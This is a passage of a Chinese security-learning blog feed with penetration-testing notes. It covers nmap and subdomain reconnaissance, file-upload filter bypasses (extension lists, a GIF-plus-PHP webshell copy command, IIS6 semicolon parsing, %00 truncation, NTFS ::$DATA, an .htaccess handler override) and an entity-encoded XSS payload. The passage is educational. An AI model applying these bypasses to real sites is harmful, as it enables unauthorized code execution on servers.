192.168.0.107</span><br><span class="line"></span><br><span class="line">nmap -v -A -F -iL target.com.txt -oX target_f.xml</span><br><span class="line"></span><br><span class="line">nmap -v -A -F -iL 1.txt -oN target_f.txt</span><br><span class="line"></span><br><span class="line">nmap -v -A -p1-65535 -iL target.com.txt -oX target_all.xml</span><br><span class="line"></span><br><span class="line">nmap -v -A -sU target.com.txt -oX target_all.xml//UDP扫描</span><br><span class="line"></span><br><span class="line">//或者使用</span><br><span class="line">御剑端口扫描 http://www.moonsec.com/post-753.html</span><br><span class="line">python端口扫描工具 一个扫描脚本：D:\xinan\saomiao\port.py</span><br></pre></td></tr></table></figure><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>CDN这个技术其实说起来并不复杂，最初的核心理念，就是<strong>将内容缓存在终端用户附近</strong>。</p><p>因为这项技术是把内容进行了分发，所以，它的名字就叫做CDN——<strong>Content Delivery Network，内容分发网络</strong>。具体来说，CDN就是采用更多的缓存服务器（CDN边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。<strong>CDN&#x3D;更智能的镜像+缓存+流量导流</strong></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>根域名：baidu.com &#x2F;&#x2F;没有www</p><p>子域名：<a href="http://www.baidu.com/">www.baidu.com</a></p><p><strong>subDomainsBrute</strong>扫描工具两种常用使用示例</p><p><code>subDomainsBrute.py aliyun.com</code></p><p><code>subDomainsBrute.py aliyun.com -f subnames_full.txt -o aliyun.com.txt</code></p><ul><li><code>-f</code>：指定一个字典文件，包含以新行分隔的子域名列表，默认为 <code>subnames.txt</code>。</li><li><code>--full</code>：表示进行完整的扫描，使用 <code>subnames_full.txt</code> 文件。</li><li><code>-i</code> 或 <code>--ignore-intranet</code>：忽略指向私有 IP 地址的域名。</li><li><code>-t</code> 或 <code>--threads</code>：指定扫描时的线程数，默认为 200。</li><li><code>-o</code> 或 <code>--output</code>：指定输出文件的名称，默认为 <code>&#123;target&#125;.txt</code>。</li></ul><p><code>http://ping.chinaz.com/blog.aliyun.com</code>判断是否是CDN</p><p><strong>wydomain</strong> 猪猪侠扫描工具 <code>https://github.com/ring04h/wydomain</code></p><p><strong>Sublist3r</strong>扫描工具 <code>https://github.com/aboul3la/Sublist3r</code></p><p><strong>浏览器 语法</strong><code>site:</code>target.com  &#x2F;&#x2F;查询内容</p><p>也可以抓包分析请求返回值(跳转&#x2F;文件上传&#x2F;app&#x2F;api接口等)</p><p>站长帮手links等在线查询网站</p><h2 id="web信息探测"><a href="#web信息探测" class="headerlink" title="web信息探测"></a>web信息探测</h2><ul><li>网站类型：判断网站是独立开发 （网络上唯一的）还是cms二次修改或cms套用模版</li><li>敏感文件：网站的登录接口、后台、未被保护的页面、备份文件（<a href="http://www.rar/">www.rar</a> webroot.zip..）</li></ul><p><strong>cms识别</strong></p><ul><li><a href="http://www.yunsee.cn/">云悉WEB指纹CMS识别</a></li><li>御剑cms识别工具&#x2F;&#x2F;D:\xinan\saomiao\御剑WEB指纹识别系统正式版(解决报毒)</li></ul><p><strong>文件和目录扫描</strong></p><ul><li>御剑后台扫描工具&#x2F;&#x2F;D:\xinan\saomiao\New御剑1.5（加强字典）</li><li>DirBuster</li><li>Pk</li></ul><p><strong>网站和常见端口的信息刺探</strong></p><p>浏览器HTTP头信息</p><ul><li><p><strong>moon_scanbak</strong> &#x2F;&#x2F;脚本：D:\xinan\saomiao\moon_scanbak.py     要在同级目录下新建或填写url.txt在里面填写网站。运行：moon_scanbak.py url.txt。</p></li><li><p><strong>insightscan&#x2F;scanner</strong>扫描工具  <a href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a></p><ul><li><strong>用法：</strong>scanner.py 103.97.177.0&#x2F;24 -p 80,8080 -t 20&#x2F;&#x2F; -t 线程，-p 指定扫描端口 。扫描开放端口</li><li><strong>用法：</strong>scanner.py 103.97.177.0&#x2F;24 -S -t 20 -d   &#x2F;&#x2F;-S –服务检测扫描内部端口，使用banner和签名。  -d –检测HTTP端口(80,80,8080)，当与-S一起使用时，将尝试使用HTTP的所有端口服务。如果找到，抓取并保存到HTML页面任何东西。</li></ul></li><li><p>[多线程]HBSv1.0.exe &#x2F;&#x2F;获取浏览器头部信息。D:\xinan\saomiao\[多线程]HBSv1.0.exe</p></li></ul><p><strong>邮箱信息收集</strong></p><ul><li><p><strong>theHarvester脚本工具</strong> <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><ul><li><strong>kali克隆</strong>  git clone <a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><ul><li><strong>安装库</strong> python3 -m pip install -r requirements.txt</li><li><strong>运行示例</strong> python3 theHarvester.py -d freebuf.com -b baidu &#x2F;&#x2F;-b 选择搜索引擎</li></ul></li></ul></li><li><p>社工库 &#x2F;&#x2F;未搭建</p></li><li><p>qq群 &#x2F;&#x2F;加入群里面搜索</p></li><li><p>whois &#x2F;&#x2F;whois命令收集信息和注册邮箱</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞篇</title>
      <link href="/post/3b46b5f7.html"/>
      <url>/post/3b46b5f7.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞篇"><a href="#文件上传漏洞篇" class="headerlink" title="文件上传漏洞篇"></a>文件上传漏洞篇</h1><h2 id="1、文件上传过程"><a href="#1、文件上传过程" class="headerlink" title="1、文件上传过程"></a><strong>1、文件上传过程</strong></h2><p>客户端 选择发送的文件-&gt;服务器接收-&gt;网站程序判断-&gt;临时文件-&gt;移动到指定的路径</p><p>服务器 接收的资源程序</p><p><strong>upload.php</strong>  &#x2F;&#x2F;判断是否有文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>客户端 上传表单</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">br</span> /&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、文件上传错误代码"><a href="#2、文件上传错误代码" class="headerlink" title="2、文件上传错误代码"></a>2、文件上传错误代码</h2><p>值：0; 没有错误发生，文件上传成功。</p><p>值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。</p><p>值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。</p><p>值：3; 文件只有部分被上传。</p><p>值：4; 没有文件被上传。</p><h2 id="3、网站文件常见的后缀名"><a href="#3、网站文件常见的后缀名" class="headerlink" title="3、网站文件常见的后缀名"></a>3、网站文件常见的后缀名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asp、asa、cdx、cer、php、aspx、ashx、jsp、php3、php.a、shtml、phtml</span><br><span class="line"></span><br><span class="line">过滤的时候可以传入这种格式</span><br><span class="line">aspasp、phpphp、或者大小写转换例如ASP、Asp</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4、造成漏洞的原因"><a href="#4、造成漏洞的原因" class="headerlink" title="4、造成漏洞的原因"></a>4、造成漏洞的原因</h2><ul><li><h4 id="程序代码和系统缺陷"><a href="#程序代码和系统缺陷" class="headerlink" title="程序代码和系统缺陷"></a><strong>程序代码和系统缺陷</strong></h4></li><li><p>文件可以直接上传可执行脚本，例如:<code>.php</code>，<code>.asp</code>，<code>.jsp</code></p></li><li><p>脚本限制,禁止js文件运行</p></li><li><p>修改html</p><ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071642291.png" alt="image-20240207100844399"></li><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643629.png" alt="image-20240207101327538"></li><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643136.png" alt="image-20240207102112307"></li></ul></li><li><p>抓包改包</p><ul><li>直接在jpg上面修改代码 如下图：先提交拦截在修改<ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643119.png" alt="image-20240207105854681"></li><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643034.png" alt="image-20240207105331359"></li></ul></li><li>在包里面修改后缀名 &#x2F;&#x2F;加入PHP代码会破坏掉jpg<ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643225.png" alt="image-20240207105331359"></li><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643873.png" alt="image-20240207105437564"></li></ul></li></ul></li><li><h4 id="黑名单白名单"><a href="#黑名单白名单" class="headerlink" title="黑名单白名单"></a><strong>黑名单白名单</strong></h4><ul><li><p>黑名单 就是指定的后缀名是禁止上传的</p><ul><li><p>黑名单过滤不全  抓包穷举后缀名</p><ul><li><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643419.png" alt="image-20240207111343088"></p></li><li><pre><code>//过滤后缀字典asp、asa、cdx、cer、php、aspx、ashx、jsp、php3、php.a、shtml、phtml、ASP、ASA、CDX、CER、PHP、ASPX、ASHX、JSP、PHP3、PHP.A、SHTML、PHTML、Asp、Asa、Cdx、Cer、Php、Aspx、Ashx、Jsp、Php3、Php.a、Shtml、Phtml<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 白名单 就是允许上传文件后缀</span><br><span class="line"></span><br><span class="line">    - jpg，png，gif 等其他图片格式</span><br><span class="line"></span><br><span class="line">- #### **文件头检测**</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    //文件头示例</span><br><span class="line">    JPEG (jpg)，文件头：FFD8FF </span><br><span class="line">    PNG (png)，文件头：89504E47</span><br><span class="line">    GIF (gif)，文件头：47494638</span><br><span class="line">    TIFF (tif)，文件头：49492A00</span><br><span class="line">    Windows Bitmap (bmp)，文件头：424D</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li><li><p>修改文件头  &#x2F;&#x2F;抓包修改 比较麻烦不好修改一般不用</p><ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643672.png" alt="image-20240207113308334"></li></ul></li><li><p>制作图片一句话</p><ul><li><p>在同一目录下cmd使用二进制向文件追加php文件</p><ul><li><pre><code>copy 1.gif/b+moon.php shell.php//  /b是二进制模式</code></pre></li></ul></li></ul></li></ul></li><li><h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a><strong>iis6.0解析漏洞</strong></h4><ul><li>文件名可控 后缀名不可控</li><li>修改文件名：在文件名后添加<code>.文件后缀后面添加“;”.后缀名</code>,例如<code>moon.asp;.jpg moon.asp;jpg</code>   不支持aspx<ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643016.png" alt="image-20240207115816202"></li></ul></li></ul></li><li><h4 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a><strong>目录解析漏洞</strong></h4><ul><li>iis6.0 文件夹只为x.asp，只要上传文件到这个文件夹里 访问就会执行脚本</li><li>上传截包修改文件名并保存<ul><li><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643159.png" alt="image-20240218093256406"></li></ul></li></ul></li><li><h4 id="00截断的应用场景"><a href="#00截断的应用场景" class="headerlink" title="%00截断的应用场景"></a><strong>%00截断的应用场景</strong></h4><ul><li>直接截断文件名</li><li>使用<code>%00</code>截断掉<code>%00</code>后面的内容，把原文件名<code>shell.gif</code>修改成<code>shell.php%00.gif</code>  <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643475.png" alt="image-20240218100212308"></li><li>右击选择Convert selection，URL，URL-decode转换为URL-decode，点击Go提交 <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071643995.png" alt="image-20240218100445121"></li><li>创建目录可控 %00截断创建目录 利用iis6.0解析漏洞 上传文件到这个目录里面<ul><li>使用<code>%00</code>截断掉<code>%00</code>后面的内容，把原文件名<code>upfile</code>修改成<code>c.asp%00xaaf</code>  <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644723.png" alt="image-20240218101540941"></li><li>右击选择Convert selection，URL，URL-decode转换为URL-decode，点击Go提交 <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644948.png" alt="image-20240218102101874"></li><li>修改回去在从新提交  <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644732.png" alt="image-20240218102502909"></li></ul></li><li>截断参数 生成文件<ul><li>使用<code>%00</code>截断掉<code>%00</code>后面的内容，添加的新参数<code>c</code>修改成<code>名字.后缀参数%00</code>   <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644348.png" alt="image-20240218103726981"></li><li>右击选择Convert selection，URL，URL-decode转换为URL-decode，点击Go提交 <img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644140.png" alt="image-20240218104323838"></li></ul></li></ul></li></ul><h2 id="5、系统特性-可以绕过一些防火墙"><a href="#5、系统特性-可以绕过一些防火墙" class="headerlink" title="5、系统特性  &#x2F;&#x2F;可以绕过一些防火墙"></a>5、系统特性  &#x2F;&#x2F;可以绕过一些防火墙</h2><p>使用<code>:</code>上传文件名为<code>a.php:.jpg</code>的时候 会在目录下生成<code>a.php</code>的空白文件 </p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644056.png" alt="image-20240218112705481"></p><p>php+window+iis  利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</p><p>双引号 <code>&quot; &quot;</code>   &#x3D;  点号 <code>.</code></p><p>大于符号 <code>&gt;</code>  &#x3D;  问号 <code>?</code></p><p>小于符号 <code>&lt;</code>  &#x3D;  星号 <code>*</code></p><p><code>文件名. &lt;</code>，<code>文件名.&lt;&lt;&lt;</code>，<code>文件名.&gt;&gt;&gt;</code>，<code>文件名.&gt;&gt;&lt;空文件名</code>，写入<code>filename.&lt;&lt;&lt;</code></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071644728.png" alt="image-20240218114426982"></p><h4 id="NTFS交换数据流"><a href="#NTFS交换数据流" class="headerlink" title="NTFS交换数据流"></a><strong>NTFS交换数据流</strong></h4><p><code>:$DATA</code> 创建文件</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071645907.png" alt="image-20240218114901693"></p><p><code>::$DATA</code> 创建和写入文件</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071645672.png" alt="image-20240218115122997"></p><h2 id="6、程序逻辑出错"><a href="#6、程序逻辑出错" class="headerlink" title="6、程序逻辑出错"></a><strong>6、程序逻辑出错</strong></h2><p><strong>空格文件上传：加有空格</strong></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071645799.png" alt="image-20240218115516736"></p><p><strong>双文件上传：</strong></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071645676.png" alt="image-20240218115516736"></p><h2 id="7、部署环境"><a href="#7、部署环境" class="headerlink" title="7、部署环境"></a>7、部署环境</h2><p><code>apache</code> 开启重写模块</p><p><code>LoadModule rewrite_module modules/mod_rewrite.so</code></p><p>重写解析  <code>.htaccess</code></p><p><code>&lt;FilesMatch &quot;jpg&quot;&gt;</code></p><p><code>SetHandler application/x-httpd-php</code></p><p><code>&lt;/FilesMatch&gt;</code></p><h2 id="8、配置错误"><a href="#8、配置错误" class="headerlink" title="8、配置错误"></a>8、配置错误</h2><p><code>1.jpg/.php</code></p><p><code>iis7.0|iis7.5|nginx 开启 fast-cgi</code></p><h2 id="9、漏洞"><a href="#9、漏洞" class="headerlink" title="9、漏洞"></a>9、漏洞</h2><p>nginx 0.83</p><p><code>/1.jpg%00php</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试中的常用编码</title>
      <link href="/post/43cea1e2.html"/>
      <url>/post/43cea1e2.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试中的常用编码"><a href="#渗透测试中的常用编码" class="headerlink" title="渗透测试中的常用编码"></a>渗透测试中的常用编码</h1><h3 id="页面编码"><a href="#页面编码" class="headerlink" title="页面编码"></a>页面编码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在网页设置网页编码在<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span>中加入设置特定html标签</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span> 这样页面的编码就会变成utf-8 ，如果没有设置编码就会使用默认的编码，而浏览器默认编码与之不同就会出现乱码。</span><br><span class="line">常用的有三种格式分别是:utf-8、gbk、gbk2312</span><br></pre></td></tr></table></figure><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p>ASCII码分为两大部分：</p><p>标准ASCII码：这是最早的版本，共有128个字符，包括控制字符（0<del>31）、数字字符（32</del>126）、大写和小写字母（65<del>90和97</del>122），以及一些标点符号和控制字符。这个范围内的字符被称为基本ASCII字符。</p><p>扩展ASCII码：为了满足更多的字符和语言编码需求，出现了扩展ASCII码。这种编码方式用8位二进制数（0~255）来表示额外的128个字符，这些字符通常在不同的字符集中有所差异。扩展ASCII码中的前128个字符与标准ASCII码相同，但后128个字符的高位均为1。</p><p>ASCII码是计算机存储和传输文本数据的基础，它确保了不同计算机之间的字符可以被正确地解释和显示。随着时间的推移，由于计算机技术的进步，7位ASCII码已经不再足够，因为它无法容纳所有的Unicode字符。因此，8位ASCII码以及其他多字节字符编码（如UTF-8、GBK、GB2312等）开始被采用，以支持更广泛的字符集和语言。</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071642432.png" alt="image-20240117222358992"></p><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p><strong>HTML 中的预留字符必须被替换为字符实体  HTML 实体</strong></p><p>在 HTML 中，某些字符是预留的。</p><p>HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p><p>字符实体类似这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;entity_name;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&amp;#entity_number;</span><br></pre></td></tr></table></figure><p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code></p><p><strong>提示：</strong>使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p><p><strong>不间断空格（non-breaking space）</strong></p><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。如需在页面中增加空格的数量，您需要使用<code>&amp;nbsp;</code> 字符实体。</p><p><strong>HTML 中有用的字符实体</strong></p><p><strong>注释：</strong>实体名称对大小写敏感！</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071642155.png" alt="image-20240122152357220"></p><p><strong>实体编码</strong></p><p><a href="http://www.w3school.com.cn/html/html_entities.asp">http://www.w3school.com.cn/html/html_entities.asp</a></p><p>HTML编码的存在就是让他在代码中和显示中分开， 避免错误。</p><p><strong>命名实体：</strong>构造是&amp;加上希腊字母，</p><p><strong>字符编码：</strong>构造是&amp;#加十进制</p><p><strong>十六进制 ASCII码或unicode字符编码</strong></p><p>浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“<strong>值</strong>”里，比如属性<strong>src</strong>里的值<strong>src&#x3D;xxxx</strong>，但却不能对<strong>src</strong>进行html编码。不然浏览器无法正常的渲染。</p><p><a href="http://www.qqxiuzi.cn/bianma/zifushiti.php">http://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><strong>执行示例：</strong></p><p>十六进制：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>引入百度log图片<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>十进制没有x，如<span class="symbol">&amp;#104;</span>十六进制<span class="symbol">&amp;#x68;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x5f;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x31;&amp;#x2e;&amp;#x70;&amp;#x6e;&amp;#x67;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>十进制：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>引入百度log图片<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>十进制没有x，如<span class="symbol">&amp;#104;</span>十六进制<span class="symbol">&amp;#x68;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#119;&amp;#119;&amp;#119;&amp;#46;&amp;#98;&amp;#97;&amp;#105;&amp;#100;&amp;#117;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#47;&amp;#105;&amp;#109;&amp;#103;&amp;#47;&amp;#98;&amp;#100;&amp;#95;&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#49;&amp;#46;&amp;#112;&amp;#110;&amp;#103;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xss：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>弹出弹窗<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span>&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是一种多功能技术，可以通过它来战胜多种类型的输入过滤器。</p><p>url编码是一种将普通文本编码再编码的方案。用于保证url数据安全传输。</p><p>url编码可以针对所有字符进行编码。</p><p>URL编码的最基本表示方式是使用问题字符的十六进制ASCII编码来替换它们，并在ASCII编码前加%。</p><p>例如，单引号字符的ASCII码为0x27，其URL编码的表示方式为%27。[<a href="http://www.moonsec.com/index.php?keyword=aa%20union%20seelct%5D">http://www.moonsec.com/index.php?keyword=aa%20union%20seelct]</a>(<a href="http://www.moonsec.com/index.php?keyword=aa">http://www.moonsec.com/index.php?keyword=aa</a> union seelct)</p><p><strong>url编码作用</strong></p><p>1、敏感字符编码</p><p>敏感字符，是指ascii编码中可能对url结构进行影响的字符，比如#</p><p>如果想表示敏感字符作为普通文本字符，比如#作为请求参数的值，可以通过对敏感字符进行URL编码，服务器接收后将视其为普通文本字符而非url结构字符。</p><p>2、控制字符</p><p>无法直接输入的字符，Ascii之内的控制字符，即0-31和127。</p><p>3、多字节字符编码</p><p>多字节字符的某个字节可能是单字节的敏感字符或控制字符，服务器可能将其误解析，因此要求对所有多字节进行URL编码。</p><p><strong>编码示例</strong></p><p>1、普通文本编码方案</p><p>一般而言，是使用utf-8对普通文本编码，这样可以兼容几乎所有字符。（至少测试过程中，最新版的Edge和firefox、chorm浏览器是如此）</p><p>2、编码</p><p>先将字符用UTF-8编码进行表示，URL编码是对每个字节前加%字符前缀。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc123      %61%62%63%31%32%33</span><br><span class="line">宇宙        